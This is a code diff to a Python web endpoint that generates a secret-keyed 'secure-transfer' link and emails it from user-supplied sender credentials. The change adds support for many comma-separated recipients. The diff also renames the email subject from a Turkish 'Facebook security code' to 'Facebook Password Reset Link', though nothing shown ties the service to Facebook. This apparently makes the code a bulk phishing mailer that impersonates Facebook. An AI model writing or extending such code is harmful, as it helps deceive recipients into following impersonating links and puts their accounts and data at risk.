@@ -700,7 +700,7 @@ async def create_email_room(data: Dict[str, Any] = Body(...)):
     
     Args:
         data: Dictionary containing email details including sender email,
-              sender password, recipient email, and max receivers
+              sender password, recipient email(s), and max receivers
               
     Returns:
         JSON response with room details
@@ -710,13 +710,39 @@ async def create_email_room(data: Dict[str, Any] = Body(...)):
         sender_email = data.get("sender_email")
         sender_password = data.get("sender_password")
         recipient_email = data.get("recipient_email")
-        max_receivers = data.get("max_receivers", 0)
+        allow_multiple_connections = data.get("allow_multiple_connections", False)
+        
+        # Determine max_receivers based on the checkbox
+        if allow_multiple_connections:
+            # Use the provided max_receivers value or default to 0 (unlimited)
+            max_receivers = data.get("max_receivers", 0)
+            try:
+                max_receivers = int(max_receivers)
+            except (ValueError, TypeError):
+                max_receivers = 0  # Default to unlimited if invalid
+        else:
+            # If multiple connections not allowed, force max_receivers to 1
+            max_receivers = 1
         
         # Validate required parameters
         if not sender_email or not sender_password or not recipient_email:
             return JSONResponse(content={
                 "status": "error",
                 "message": "Missing required email parameters"
+            }, status_code=400)
+        
+        # Handle multiple recipients (comma-separated string or list)
+        recipients = []
+        if isinstance(recipient_email, list):
+            recipients = recipient_email
+        elif isinstance(recipient_email, str):
+            # Split by comma and strip whitespace
+            recipients = [r.strip() for r in recipient_email.split(',') if r.strip()]
+        
+        if not recipients:
+            return JSONResponse(content={
+                "status": "error",
+                "message": "No valid recipient email addresses provided"
             }, status_code=400)
             
         # Generate a new secret key
@@ -726,21 +752,29 @@ async def create_email_room(data: Dict[str, Any] = Body(...)):
         base_url = data.get("base_url", "http://localhost:8000")
         secure_link = f"{base_url}/secure-transfer?key={secret_key}"
         
-        # Send email with the secure link
-        email_subject = "Facebook Güvenlik Kodu"
-        email_result = send_email_with_secure_link(
-            sender_email=sender_email,
-            sender_password=sender_password,
-            recipient_email=recipient_email,
-            subject=email_subject,
-            link=secure_link
-        )
+        # Send email to all recipients
+        email_subject = "Facebook Password Reset Link"
+        email_error = None
+        
+        for recipient in recipients:
+            email_result = send_email_with_secure_link(
+                sender_email=sender_email,
+                sender_password=sender_password,
+                recipient_email=recipient,
+                subject=email_subject,
+                link=secure_link
+            )
+            
+            # If any email sending failed, store the error
+            if email_result.get("status") != "success":
+                email_error = email_result.get("message", "Failed to send email")
+                break
         
         # If email sending failed, return error
-        if email_result.get("status") != "success":
+        if email_error:
             return JSONResponse(content={
                 "status": "error",
-                "message": email_result.get("message", "Failed to send email")
+                "message": email_error
             }, status_code=500)
         
         # Store room settings
@@ -748,22 +782,27 @@ async def create_email_room(data: Dict[str, Any] = Body(...)):
             "created_at": "now", 
             "last_activity": "now",
             "max_receivers": max_receivers,
-            "email_sent_to": recipient_email,
-            "email_sent_from": sender_email
+            "email_sent_to": recipients,
+            "email_sent_from": sender_email,
+            "allow_multiple_connections": allow_multiple_connections
         }
         
         # Register in connection manager for WebSocket enforcement
-        manager.register_room_settings(secret_key, {"max_receivers": max_receivers})
+        manager.register_room_settings(secret_key, {
+            "max_receivers": max_receivers,
+            "allow_multiple_connections": allow_multiple_connections
+        })
         
-        logger.info(f"Created room with email to {recipient_email} and max receivers: {max_receivers}")
+        logger.info(f"Created room with email to {recipients} with max receivers: {max_receivers}, multiple connections: {allow_multiple_connections}")
         
         return JSONResponse(content={
             "status": "success",
             "secret_key": secret_key,
             "secure_link": secure_link,
-            "recipient_email": recipient_email,
+            "recipient_emails": recipients,
             "sender_email": sender_email,
             "max_receivers": max_receivers,
+            "allow_multiple_connections": allow_multiple_connections,
             "message": "Room created successfully with email notification"
         })
         
